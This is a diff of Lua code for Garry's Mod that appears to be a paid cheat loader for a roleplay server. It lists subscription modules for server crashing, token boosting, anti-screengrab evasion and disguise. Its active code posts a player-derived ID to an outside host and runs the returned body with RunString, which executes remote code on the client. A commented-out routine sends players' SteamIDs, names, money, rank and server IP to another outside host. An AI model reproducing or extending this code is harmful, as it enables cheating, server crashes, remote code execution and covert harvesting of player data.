+dataitnfo = "01.01.1990 NEW"
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/cod/111/"..named.."/date.txt",
+function( body, length, headers, code )
+if code == 404 then
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E11352 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+local dateinfo = body
+if dateinfo == "0" then
+else
+dataitnfo = dateinfo
+namedtextdata:SetText(dateinfo)
+end end end,
+function( message )
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+
+posishion = numbersch * 47 + 0 + 6
+namedtextdata:SetPos( 315, posishion ) 
+namedtextdata:SetColor(getcolormixer(6, 255))
+namedtextdata:SetFont(getfontfe(4))
+namedtextdata:SetText(dataitnfo) 
+namedtextdata:SizeToContents() 
+namedtextdata:SetDark( 1 ) 
+
+
+
+
+------------------------------------------------------Время подписки
+
+local subs = DScrollPanel:Add( "DLabel", gavteeesk )
+
+subs:SetText("-1 дней      ")
+posishion = numbersch * 47 + 0 + 6
+subs:SetPos( 230, posishion ) 
+subs:SetColor(getcolormixer(6, 255))
+subs:SetFont(getfontfe(4))
+--print(timedsrpod)
+subs:SizeToContents() 
+subs:SetDark( 1 ) 
+
+
+if dayskolvo then
+if dayskolvo == 0 then
+textdaystype = "дней"
+elseif dayskolvo >= 5 then
+textdaystype = "дней"
+elseif dayskolvo >= 2 then
+textdaystype = "дня"
+elseif dayskolvo == 1 then
+textdaystype = "день"
+else
+textdaystype = "дней"
+end
+else
+textdaystype = "дней"
+end
+
+if dayskolvo then
+
+if dayskolvo >= 1800 then
+subs:SetText("Lifetime")
+else
+subs:SetText(dayskolvo.." "..textdaystype)
+end
+
+
+end
+
+
+
+--полосы между функциями
+testpansgbuhu.Paint = function(self, w, h)
+colorsss1 = 8
+colorsss2 = 502
+pos2 = 37
+
+surface.SetDrawColor( getcolormixer(1, 70) ) -- красный цвет
+
+for i = 1,numbersch do
+--for i = 1,7 do
+surface.DrawLine( colorsss1, pos2 + 0, colorsss2, pos2 + 0 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, pos2 + 1, colorsss2, pos2 + 1 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, pos2 + 2, colorsss2, pos2 + 2 ) -- дополнительная полоса под кнопками
+pos2 = pos2 + 47
+end
+end
+
+
+--длинна панели с полосами
+testpansgbuhu:SetHeight( 50 * numbersch + 50 )
+
+
+
+--changelog:SetVisible( false )
+--changelogbut:SetVisible( true )
+namedtextdata:SetVisible( true )
+namestext:SetVisible( true )
+namesss:SetVisible( true )
+numbersch = numbersch + 1
+addnumbers()
+end
+
+
+
+
+
+/*
+--КОРОЧЕ, МОЖНО СДЕЛАТЬ ТАК ЧТО КОГДА ЧЕЛОВЕК НАЖИМАЕТ НА ЗАПУСТИТЬ СКРИПТ, ВЫЗЫВАЕТСЯ ФУНКЦИЯ КОТОРАЯ СКРЫВАЕТ ТЕКУЩУЮ ПАНЕЛЬ, ОТКРЫВАЕТ ДРУГУЮ ГДЕ
+--НАПИСАНО ЗАГРУЗКА, И УЖЕ В САМОМ СКРИПТЕ СДЕЛАТЬ ЗАКРЫТИЕ ЭТОЙ ХУЙНИ, ЕСЛИ НЕ ЗАКРОЕТСЯ ТО ПИШЕТ ОШИБКУ И ОБРАТНО ПЕРЕКИДЫВАЕТ, А ЕЩЁ В ЭТОМ СКРИПТЕ СДЕЛАТЬ ТАК ЧТО БЫ УДАЛЯЛО ТАЙМЕР КОТОРЫЙ БУДЕТ ПОКАЗЫВАТЬ ЧТО ТИП ОШИБКА
+*/
+
+
+
+/*
+
+local fastheal = 1
+local antisg = 0
+local speedhack = 0
+local crash = 0
+local givetokens = 0
+
+*/
+
+
+--Экран загрузки
+loaderss:Dock( TOP ) -- Dock it
+loaderss:SetHeight( 438 ) -- Set height
+loaderss.Paint = function(self, w, h)
+draw.RoundedBox(0, 8, 61, 344, h, Color(255, 170, 249, colorglav))
+end
+loaderss:SetVisible( false );
+
+
+
+--Текст на экране загрузки
+textloaderscr:SetPos( 155, 220 ) 
+textloaderscr:SetColor(colortextsubs)
+textloaderscr:SetFont(getfontfe(6))
+textloaderscr:SetText( "Загрузка скрипта... .........." ) 
+textloaderscr:SizeToContents() 
+textloaderscr:SetDark( 1 ) 
+textloaderscr:SetVisible( false );
+
+
+
+function loaderscreenbut()
+textloaderscr:SetVisible( false )
+textloaderscr:SetVisible( true )
+
+gavteeesk:SetVisible( false );
+loaderss:SetVisible( true );
+--unikidbutton:SetVisible( false );
+textloaderscr:SetText( "   Загрузка скрипта..." )
+timer.Create (  "loadermenusss" , 8 , 0 , function ( ) 
+
+timer.Destroy("loadermenusss")
+timer.Destroy("textmenuloadersss")
+timer.Destroy("loadermenusss111")
+timer.Destroy("loadermenusss222")
+timer.Destroy("loadermenusss333")
+textloaderscr:SetText( " Не удалось запустить" )
+
+timer.Simple(2, function()
+gavteeesk:SetVisible( true );
+loaderss:SetVisible( false );
+unikidbutton:SetVisible( true );
+end)
+
+end)
+
+function timercreee()
+timer.Create (  "loadermenusss111" , 1 , 1 , function ( ) 
+textloaderscr:SetText( "   Загрузка скрипта." )
+timer.Create (  "loadermenusss222" , 1 , 1 , function ( ) 
+textloaderscr:SetText( "   Загрузка скрипта.." )
+timer.Create (  "loadermenusss333" , 1 , 1 , function ( ) 
+textloaderscr:SetText( "   Загрузка скрипта..." )
+end)
+end)
+end)
+end
+
+timercreee()
+timer.Create (  "textmenuloadersss" , 3 , 0 , function ( )
+timercreee()
+end)
+
+
+
+
+end
+
+twxxxx:SetVisible( true )
+function addnumbers()
+
+if numbersch == 0 then
+twxxxx:SetText( "           У вас нет активных подписок!!!!" )
+twxxxx:SetVisible( true )
+showofflabelbody()
+elseif numbersch == 1 then
+twxxxx:SetText( "           У вас 1 активная подписка :)" )
+showonlabelbody()
+twxxxx:SetVisible( false )
+elseif numbersch >= 2 && numbersch <= 4 then
+twxxxx:SetText( "           У вас "..numbersch.." активные подписки :) :)" )
+showonlabelbody()
+twxxxx:SetVisible( false )
+elseif numbersch >= 5 then
+twxxxx:SetText( "           У вас "..numbersch.." активных подписок :) :) :)" )
+showonlabelbody()
+twxxxx:SetVisible( false )
+end
+
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--кнопка обновить
+buttonreload:SetSize(94, 30)
+buttonreload:SetPos( 215, 43)
+--buttonreload:SetText("")
+buttonreload:SetFont(getfontfe(1))
+/*
+buttonreload.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("Обновить", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 94, 30, 3 )
+end
+*/
+
+            buttonreload.Paint = function( this, w, h )
+				createpainbttonset(
+					"Обновить",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(2, 110),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this
+				)
+            end
+			
+            buttonreload.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 94, 30, 3 )
+            end
+			
+			
+			
+buttonreload.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+closeallpanelsimeuk()
+testpansss:Close()
+loadloader()
+testpansss:SetVisible( true )
+
+
+
+
+
+rp.Notify(NOTIFY_BLUE, "Список подписок обновлён")
+if antisgpnstatusirmg then
+offnotisg() -- антисг уведомления
+end
+end
+
+buttonreload:SetEnabled( false )
+timer.Create (  "s.loaderstart" , 4 , 1 , function()
+buttonreload:SetEnabled( true )
+end)
+
+
+--buttonsettings:SetTooltip( "Click button then press any key to change bind" )
+buttonsettings:SetSize(100, 30)
+buttonsettings:SetPos( 390, 43)
+--buttonsettings:SetText("")
+buttonsettings:SetFont(getfontfe(1))
+/*
+buttonsettings.Paint = function( self, w, h)
+--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
+draw.SimpleText("Настройки", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 100, 30, 3 )
+end
+*/
+
+
+            buttonsettings.Paint = function( this, w, h )
+				createpainbttonset(
+					"Настройки",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(2, 110),
+					getcolormixer(4, 200),
+					130,
+					0,
+					w,
+					h,
+					this)
+            end
+			
+            buttonsettings.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                --rpui.DrawStencilBorder( this, 0, 0, w, h, 0.1, Color(255, 0, 0, 90), Color(255, 0, 0, 90), this.GetAlpha(this) / 255 );
+surface.SetDrawColor( getcolormixer(1, 128) )
+surface.DrawOutlinedRect( 0, 0, 100, 30, 3 )
+            end
+
+
+
+
+buttonsettings.DoClick = function()
+surface.PlaySound( "garrysmod/ui_click.wav" )
+
+closeallpanelsimeuk()
+panelsetting:SetVisible( true );
+
+
+end 
+buttonsettings:SetVisible( true )
+
+
+keybindmenu.DoClick = function(self)
+            keybindmenu.Paint = function( this, w, h )
+				createpainbttonset(
+					"Нажмите клавишу..",
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(4, 255),
+					getcolormixer(4, 200),
+					255,
+					50,
+					w,
+					h,
+					this)
+				
+            end
+			
+			
+	input.StartKeyTrapping()
+	self.Trapping = true
+end
+
+
+
+local function changebindkeysoloader(numberkey)
+
+
+            keybindmenu.Paint = function( this, w, h )
+				createpainbttonset(
+					"Menu BindKey: "..input.GetKeyName( numberkey ),
+					getcolormixer(3, 190),
+					getcolormixer(3, 255),
+					getcolormixer(4, 255),
+					getcolormixer(4, 200),
+					255,
+					50,
+					w,
+					h,
+					this
+				)
+            end
+			
+            keybindmenu.PaintOver = function( this, w, h )
+                if not IsValid(this) then return end
+                rpui.DrawStencilBorder( this, 0, 0, w, h, 0.09, getcolormixer(2, 128), getcolormixer(2, 128), this.GetAlpha(this) / 255 );
+            end
+end
+
+
+
+
+
+function keybindmenu:OnChange( num )
+local nums = num
+
+if num == 57 then
+--keybindmenu:SetText("NONE")
+keybindsettingloader = 120
+changebindkeysoloader(120)
+--file.Write( "lop2/config/me/bindmenu.txt", 120 )
+RunConsoleCommand("loader_menubindnumber", 120)
+else
+	--LocalPlayer():ChatPrint("New bound key: "..input.GetKeyName( nums ))
+	keybindsettingloader = nums
+	changebindkeysoloader(nums)
+	--file.Write( "lop2/config/me/bindmenu.txt", nums )
+	RunConsoleCommand("loader_menubindnumber", nums)
+end
+end
+
+concommand.Add("loader_resetbindmenu", function()
+keybindsettingloader = 72
+--file.Write( "lop2/config/me/bindmenu.txt", 72 )
+RunConsoleCommand("loader_menubindnumber", 72)
+keybindmenu:SetValue( 72 )
+changebindkeysoloader(72)
+rp.Notify(NOTIFY_BLUE, 'Кнопка открытия лоадера установлена на "Insert"')
+if antisgpnstatusirmg then
+offnotisg() -- антисг уведомления
+end
+end)
+
+
+
+
+
+--if (file.Exists( "lop2/config/me/bindmenu.txt", "DATA" )) == true then
+--print("Прошли проверку АнтиСкринГраба")
+if convarbindmenus1:GetInt() >= 0 && convarbindmenus1:GetInt() <= 999999999 then
+--print("1")
+keybindsettingloader = convarbindmenus1:GetInt()
+keybindmenu:SetValue( keybindsettingloader )
+--rp.Notify(NOTIFY_GREEN, "Поставили число "..keybindsettingloader)
+else
+--file.Write( "lop2/config/me/bindmenu.txt", 72 )
+RunConsoleCommand("loader_menubindnumber", 72)
+keybindsettingloader = 72
+--rp.Notify(NOTIFY_BLUE, "Записали 72 число")
+keybindmenu:SetValue( 72 )
+--print("СОЗДАЕМ")
+end
+
+/*
+
+convarbindmenus1:GetInt()
+RunConsoleCommand("loader_menubindnumber", nums)
+
+
+elseif (file.Exists( "lop2/config/me/bindmenu.txt", "DATA" )) == false then
+file.CreateDir("lop2/config/me")
+file.Write( "lop2/config/me/bindmenu.txt", 72 )
+keybindsettingloader = 72
+--rp.Notify(NOTIFY_BLUE, "Полностью создали 72 число")
+keybindmenu:SetValue( 72 )
+--print("Не прошли проверку и создали файл")
+--end
+*/
+
+
+
+if fewyujnnmelgiujkhr then
+else
+efeyhej0wujmev = false
+teeestttttt = false
+end
+
+hook.Add("Think", "ofjreiobhrtjkoirt", function()
+if !input.IsKeyDown(keybindsettingloader) then
+efeyhej0wujmev = false
+end
+
+if !efeyhej0wujmev then
+if input.IsKeyDown(keybindsettingloader) then
+if !teeestttttt then
+teeestttttt = true
+efeyhej0wujmev = true
+--print("ON")
+testpansss:SetVisible( true )
+testpansss:MakePopup()
+
+elseif teeestttttt then
+teeestttttt = false
+efeyhej0wujmev = true
+--print("OFF")
+testpansss:SetVisible( false )
+end
+end
+end
+
+
+---проверка Ё меню
+end)
+
+
+
+
+
+
+
+
+posishion = 65
+numbersch = 0
+
+
+
+
+
+
+
+
+
+
+-------------------ТИП ПОДПИСКИ И ВРЕМЯ
+local function dateinfogetinpost(namesskiprter ,datatextget, namesskeofrkmeo, statusid)
+
+/*
+years1, day1, mouth1, testlog, status1, timersdata = ""
+
+statusid = namesskeofrkmeo
+
+--------------ДЕЛАЕТ ЗАПРОС НА МОЙ САЙТ ЧТО БЫ УЗНАТЬ ДО КАКОГО ПОДПИСКА
+local svernik = string.reverse( string.Right( ply:SteamID64(), 10 ) / 4)
+http.Fetch( "https://testgmod.ucoz.net/"..svernik.."/"..datatextget..".txt",
+function( body, length, headers, code )
+if code == 404 then
+--MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E113512 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+
+
+--RunString(body)
+
+if checkssun(body, "R17693") then -- проверка ссылки
+RunString(body) else return
+end
+
+--PrintTable(testlog)
+
+for k, v in pairs(testlog) do
+if k == "day" then
+day1 = v
+end
+if k == "mouth" then
+mouth1 = v
+end
+if k == "years" then
+years1 = v
+end
+if k == "status" then
+statusid = v
+end
+end
+
+
+
+-----------------------ЗАПРАШИВАЕТ ВРЕМЯ ДО КАКОГО ПОДПИСКА
+http.Post( "https://hl2rpclassic.fun/gmodfun/info/time/time.php", { god = years1.."", mes = mouth1.."", day = day1.."" },
+--http.Fetch( "https://showcase.api.linx.twenty57.net/UnixTime/tounix?date="..years1.."/"..mouth1.."/"..day1.."%2001:00:00",
+--http.Post( "http://aowalop.beget.tech/time/time.php", { god = years1, mes = mouth1, day = day1 },
+--
+function( body, length, headers, code )
+if code == 404 then
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E113513 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+local teeest = string.reverse( string.Right( string.reverse( string.Right( body, 11 )) , 10 ))
+
+
+-------------------ЗАПРАШИВАЕТ ТЕКУЩЕЕ ВРЕМЯ
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/info/time/time1.php",
+--http://aowalop.beget.tech/time/time1.php
+--https://showcase.api.linx.twenty57.net/UnixTime/tounixtimestamp?datetime=now
+function( body, length, headers, code )
+if code == 404 then
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E1135 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+else
+local unixtimeloc = body
+
+local teotko = string.Explode( ".", (teeest - unixtimeloc) / 60 / 60 / 24)
+for k, v in pairs(teotko) do
+if k == 1 then
+local timersdata = v + 1
+
+if statusid == "on" then
+if timersdata >= 1 then
+--namesskeofrkmeo(timersdata, datatextget)
+
+addbuttiins(namesskiprter, datatextget, timersdata)
+
+end
+end
+
+
+--print("Осталось дней: "..timersdata.." "..datatextget)
+end
+end
+
+--------ОЧИЩАЕТ ВСЕ ПЕРЕМЕННЫЕ
+
+end end,
+function( message )
+--MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+end end,
+function( message )
+--MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+end end,
+function( message )
+--MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "КОД ОШИБКИ: E8743 \n", Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ) ,"ЗАПУСТИТЕ СКРИПТ ЧЕРЕЗ ПАРУ МИНУТ (ЕСЛИ ОШИБКА ОСТАНЕТСЯ ТО ОТПИШИТЕ МНЕ)", "\n \n")
+end)
+*/
+
+
+
+-------------ЗАПРОС ЧЕРЕЗ БД
+-------------ЗАПРОС ЧЕРЕЗ БД
+-------------ЗАПРОС ЧЕРЕЗ БД
+-------------ЗАПРОС ЧЕРЕЗ БД
+
+
+
+
+testrundateddd,statusloadedii,day1lodrd = ""
+
+
+--local namesss = "invfix"
+
+local svernik = string.reverse( string.Right( ply:SteamID64(), 10 ) / 4)
+http.Post( "http://aowalop.beget.tech/testtime.html", {sve = svernik, names1 = datatextget, names2 = (datatextget.."time")},
+
+	-- onSuccess function
+	function( body, length, headers, code )
+		--RunString( body )
+		
+		if checkssun(body, "R86693") then -- проверка ссылки
+		RunString(body) else return
+		end
+		
+			for k, v in pairs(testrundateddd) do
+			if k == "status" then
+			statusloadedii = v
+			end
+			if k == "day" then
+			day1lodrd = v
+			end
+			end
+			
+			
+			local timeunixtoday = string.Explode( ".", day1lodrd / 60 / 60 / 24)
+			
+			
+			for k, v in pairs(timeunixtoday) do
+			if k == 1 then
+			local timersdata = v + 1
+			if statusloadedii == "on" then
+			if timersdata >= 1 then
+
+			addbuttiins(namesskiprter, datatextget, timersdata)
+			--print("Осталось дней: "..timersdata, namesskiprter)
+
+			end
+			end
+			end
+			end
+
+		
+		
+	end,
+
+	-- onFailure function
+	function( message )
+		--print( message )
+	end
+
+)
+
+
+
+
+
+
+end
+
+
+
+--zaklad 1
+
+if LocalPlayer():SteamID() == "STEAM_0:0:574178449" then
+
+dateinfogetinpost("ФастХилка", "fastheal")
+dateinfogetinpost("Краш", "crash")
+dateinfogetinpost("Агитация", "agitka")
+dateinfogetinpost("АнтиСкринграб", "antisg")
+dateinfogetinpost("Фикс инвентаря", "invfix")
+dateinfogetinpost("Накрутка токен", "givetokens")
+
+dateinfogetinpost("ФастХилка", "fasthealprem")
+
+dateinfogetinpost("Маскировка", "disk")
+dateinfogetinpost("FPS Booster", "fpsboost")
+dateinfogetinpost("TFA Fix", "tfafix")
+
+elseif LocalPlayer():SteamID() == "STEAM_0:1:508177442" then --zol
+
+dateinfogetinpost("Schneller Verbandskasten", "fastheal")
+dateinfogetinpost("МЕГАКРАШ", "crash")
+dateinfogetinpost("Werbung", "agitka")
+dateinfogetinpost("огитация2", "antisg")
+dateinfogetinpost("фигня", "invfix")
+dateinfogetinpost("тоже фигня", "givetokens")
+
+dateinfogetinpost("у нас нет такого", "fasthealprem")
+
+dateinfogetinpost("Maskierung", "disk")
+dateinfogetinpost("Збільшення кадрів в секунду", "fpsboost")
+dateinfogetinpost("TFA Fix", "tfafix")
+
+else
+
+dateinfogetinpost("ФастХилка", "fastheal")
+dateinfogetinpost("Краш", "crash")
+dateinfogetinpost("Агитация", "agitka")
+dateinfogetinpost("АнтиСкринграб", "antisg")
+dateinfogetinpost("Фикс инвентаря", "invfix")
+dateinfogetinpost("Накрутка токен", "givetokens")
+
+dateinfogetinpost("ФастХилка", "fasthealprem")
+
+dateinfogetinpost("Маскировка", "disk")
+dateinfogetinpost("FPS Booster", "fpsboost")
+dateinfogetinpost("TFA Fix", "tfafix")
+
+
+end
+
+
+concommand.Add("debug_loader", function()
+yukgemiefjeurgjrehjf = false
+end)
+
+concommand.Add("debug_loader_reload", function()
+timer.Create('entireibrkmrirbfkdjvjerg4ehb', 3, 1, function()
+closeallpanelsimeuk()
+testpansss:Close()
+loadloader()
+testpansss:SetVisible( true )
+end)
+end)
+
+concommand.Add("debug_loader_close", function()
+testpansss:Close()
+hook.Remove("Think","ofjreiobhrtjkoirt")
+end)
+
+
+
+	
+
+
+
+
+
+
+---------------------------------------------------------дата игрока----------------------------
+/*
+local AfkTime = 0
+local LastPos = Vector(0, 0, 0)
+timer.Create('check_afkie', 1, 0, function()
+		if (LastPos:DistToSqr(ply:GetPos()) <= 25) then
+			AfkTime = (AfkTime + 1)
+			
+		else
+			AfkTime = 0
+		end
+		LastPos = LocalPlayer():GetPos()
+	end)
+
+kavkazfirst = "да"
+local function checkdatacoidmoi()
+
+if !ply:IsDisguised() then
+ssmaska = "OFF"
+else
+ssmaska = "ON"
+end
+
+if kavkazfirst == "да" then
+namefileok = " first"
+else
+namefileok = ""
+end
+
+
+local svernik = string.reverse( string.Right( ply:SteamID64(), 10 ) / 4)
+http.Post( "https://hl2rpclassic.fun/gmodfun/info/stats/code.php", { sverhid = svernik, map = game.GetMap(), steamid = ply:SteamID(), rpname = ply:Name(), maskirovka = ssmaska, money = ply:GetNetVar("Money").."", job = ply:GetJobName(),
+afktime = AfkTime.."", credit = ply:GetCredits().."", ipserver = game.GetIPAddress(), firstconnect = kavkazfirst, namefile = namefileok, rank = ply:GetRank()..""},
+
+	-- onSuccess function
+	function( body, length, headers, code )
+		--print( body )
+	end,
+
+	-- onFailure function
+	function( message )
+		--print( message )
+	end
+
+)
+
+
+
+kavkazfirst = "нет"
+end
+
+timer.Create('startdataidk', 300, 0, function() checkdatacoidmoi() end)
+timer.Create('startdataidk11', 60, 1, function() checkdatacoidmoi() end)
+*/
+--------------------------------------------------------------
+
+
+
+
+
+hook.Add("Think", "loadercheckmschelp", function()
+if antisgpnstatusirmg then
+if speclistcfgloadfinish then
+
+
+if !fewyujnnmelgiujkhr then
+hook.Remove("Think","loadercheckmschelp")
+fewyujnnmelgiujkhr = true
+
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 75, 255, 135 ), "Loader has finished loading\n")
+
+coloragitka1 = Color( 186, 223, 21 )
+coloragitka2 = Color( 220, 150, 9 )
+MsgC( Color( 0, 144, 255 ), "\n", coloragitka1, "------------------------------------------------------------\n")
+MsgC( coloragitka1, "--------------", coloragitka2, "STANDART KEY OPEN LOADER: Insert", coloragitka1, "--------------\n")
+MsgC( coloragitka1, "------------", coloragitka2, "TO RESET BINDS: loader_resetbindmenu", coloragitka1, "------------")
+MsgC( Color( 0, 144, 255 ), "\n", coloragitka1, "------------------------------------------------------------\n")
+end
+
+
+end
+end
+end)
+
+
+---------------------------ПОТОМ НАДО СДЕЛАТЬ ПРОВЕРКУ НА ВРЕМЯ, ЕСЛИ БОЛЬШЕ 7 ЛЕТ ТО ЧТО БЫ ПИСАЛО LIFETIME, СДЕЛАТЬ ТИП IF ТАКОЙ ТО > 7ЛЕТ ТОГДА LIFETIME ELSE ..TIME
+--spid3rm0nk3y40
+
+end loadloader()
+
+--end
+
+
+end) if !succ then if err then errorfolenorik(err, "LoaderGlav") end end
+
+
+
+
+
+
+
+
+
+
+
